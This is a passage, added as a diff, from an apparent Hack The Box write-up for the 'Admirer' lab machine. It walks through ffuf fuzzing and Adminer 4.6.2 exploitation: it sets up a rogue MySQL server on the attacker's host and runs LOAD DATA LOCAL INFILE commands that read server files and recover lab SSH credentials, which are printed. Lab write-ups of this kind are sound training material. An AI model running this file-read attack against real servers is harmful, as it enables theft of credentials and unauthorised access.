@@ -128,3 +128,96 @@ With everything that we found I looked back and thought about running ffuf again
 I use `ffuf -c -u http://10.10.10.187/utility-scripts/FUZZ -w /home/Shellshock/Documents/wordlists//directory-list-2.3-medium.txt:FUZZ -t 60 -o fuff_admirer/utility-scripts/_results -e .txt,.php,.zip,.gz`
 I added that .gz after we found that html.tar.gz 
 Didn't find anything here. I was stuck at this point. I found credentials but no where to plug them into. And my scans weren't picking anything up. I went to google to try and find some help, a write up. This is perfectly fine, don't think you will ever know how to do everything and know everything. There will be times when you need help. Just don't be to proud to ask. I went to ippsec. You can find his YouTube channel here. https://www.youtube.com/c/ippsec I like his videos because he will go through every step as if you don't know anything at all about the machine. I've seen other channels were they go straight through the machine as if the process was known. I learned a lot from this video. I learned the power of a good wordlist is crucial. One wordlist found the directory where as the other wordlist did not. It is also important to look at more than one writeup for the same machine, because everyone will have different methods to complete the box, the more methods you learn the more you can broaden your toolset. Lets get back to the box now.
+
+I took his advice and used a different wordlist. I used the one that he used. /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+`ffuf -c -u http://10.10.10.187/utility-scripts/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e .txt,.php,.zip,.html,.rar -t 60 | tee ./adminer_utility-scripts_fuzz_results.txt`
+
+![ffuf_utility-scripts_results](https://user-images.githubusercontent.com/110210595/189809630-8ee42688-4257-45f1-8b58-1f47a811e8b6.png)
+
+we found the adminer.php directory. Navigating to http://10.10.10.187/utility-scripts/adminer.php brings us to an Adminer 4.6.2 MySQL login page.
+
+![adminer_php_login](https://user-images.githubusercontent.com/110210595/189809738-9f8e7628-0c37-4baf-ad99-126171e5b1d9.PNG)
+
+This was another tricky part that I haven't done before. Which was sending the Adminer mysql requests to our attacking machines mysql. 
+Ippsec taught this very well.<br>
+
+First you have to restart the mysql service. `sudo service mysql restart`<br>
+Then, you start the mysql service. `sudo service mysql start`<br>
+Now you can start the MariaDB with `sudo mysql`<br>
+Create a database, you can name it anything you want.<br>
+`create database Shellshockdb;`<br>
+Create a user for this database that will connect to the victim machines database. This is where were funneling the request and information to our machine.
+You IDENTIFY with a password of your choice..<br>
+`create user 'Shellshock'@'10.10.10.187' IDENTIFIED BY 'DontExploitMePls';`<br>
+Grant all privileges to the user in the given database that we just created.<br>
+`GRANT ALL on Shellshockdb.* TO 'Shellshock'@'10.10.10.187';`
+Flush privileges will reload the grant tables. This is similar to resetting the settings after changing the rules with the GRANT ALL. This will make them take effect.
+`FLUSH PRIVILEGES;`<br>
+I was told to have the password as DontExploitMePls because your machine will be hosted up for anyone to connect to. Meaning anyone else doing this box may see your machine connected to or communicated with it on port 3306. This way If they crack the password to the account they'll hopefully be nice and not try to exploit you while you're doing this machine. 
+
+Now this is <strong>VERY IMPORTANT</strong>. We have to change the bind address in the <strong>/etc/mysql/mariadb.conf.d/50-server.cnf</strong> file. This way the admirerdb will connect back to us.<br>
+<strong>YOU MUST</strong> remember to change this back to the original 127.0.0.1. Otherwise your machine can be vulnerable to anyone else who doing this machine.
+
+![bind_address](https://user-images.githubusercontent.com/110210595/189810134-4abc5d04-ef9a-4089-8b8a-cab051a01aca.PNG)
+
+<strong>REMEMBER CHANGE THIS BACK TO 127.0.0.1</strong> when you're done with the machine.<br>
+
+Ok. With all this set up, we will be able to log in and connect to the database.<br>
+
+![adminer_login_credentials](https://user-images.githubusercontent.com/110210595/189810278-b2391956-c55a-4dba-83f1-aadc45d24bc2.PNG)
+
+Server:attacking_machine_ip or the bind-address you set in the mariadb conf file.<br>
+Username:Username we created earlier - Shellshock<br>
+Password:Password we IDENTIFIED with earlier - DontExploitMePls<br>
+Database:We created earlier - Shellshockdb<br>
+
+![adminer_login_success](https://user-images.githubusercontent.com/110210595/189810359-98e549c5-b8e3-489d-9256-95d32bf24601.PNG)
+
+from here you can google adminer php exploit. This is running on <em><strong>adminer 4.6.2</em></strong>
+google will bring up a file disclosure vulnerability. `LOAD DATA INFILE` This is the sql command we will use to access files.<br>
+https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/<br> 
+or from https://www.youtube.com/c/ippsec both will show the exploit in progress.<br>
+We have to create a table to load the file into that way we have a place to store it and we can read it.<br>
+I went into the create table option and named it Shock. I named the column info.<br>
+
+![shock_table](https://user-images.githubusercontent.com/110210595/189810505-69e79b85-a9c0-4636-9dbe-7ccd20e51227.PNG)
+
+we try to do `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE Shock FIELDS TERMINATED BY "\n"`<br>
+
+but we get an error: open_basedir restriction in effect. Unable to open file.<br>
+google searching tells us that this is a security setting in the configuration file. This way we can't open and access any file we want.<br>
+opening the <em><strong>info.php(php configuration file)</em></strong> file in utility-scripts shows that were only allowed to open files in <em></strong>/var/www/html</em></strong><br>
+There is one file in the html folder called <em><strong>index.php</em></strong>
+
+I use `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE Shock FIELDS TERMINATED BY "\n"`
+and says 123 rows affected.<br>
+
+I click on warnings and it shows<br>
+
+![index_php_results](https://user-images.githubusercontent.com/110210595/189810860-0ca59a62-9eae-4d6b-a6bd-f406fa77868b.PNG)
+
+which is our third set of credentials for waldo. 
+
+waldo : ]F7jLHw:*G>UPrTo}~A"d6b
+waldo : Wh3r3_1s_w4ld0?
+waldo : &<h5b~yK3F#{PaPB&dA}{H>
+
+With these credentials I try to SSH into waldo<br> 
+ssh waldo@10.10.10.187<br>
+
+![ssh_success](https://user-images.githubusercontent.com/110210595/189810985-bf1c7e7f-864a-45a9-a1b6-8432929e6f0a.png)
+
+We got ssh access!<br>
+
+![COWABUNGA](https://user-images.githubusercontent.com/110210595/189811060-b0292346-d7c5-460f-abe6-03311819b901.png)
+
+Even better, we `ls` and instantly get a <em><strong>user.txt</em></strong flag.
+
+![Mikey_being_a_savage](https://user-images.githubusercontent.com/110210595/189811176-4242071c-ed25-459e-b09c-ed082c04153d.png)
+
+Now I start off with `sudo -l` to see what sudo permissions we have. (ALL) SETENV: /opt/scripts/admin_tasks.sh
+I cd /opt/scripts/ and there are two files here:
+admin_tasks.sh - backup.py
+I do ls -la and we don't have any permissions. We can only read them.
+cat admin_tasks.sh
+It seems to be backing up passwords from /etc/passwd, /etc/shadow, to a passwd.bak and shadow.bak. From backup.py
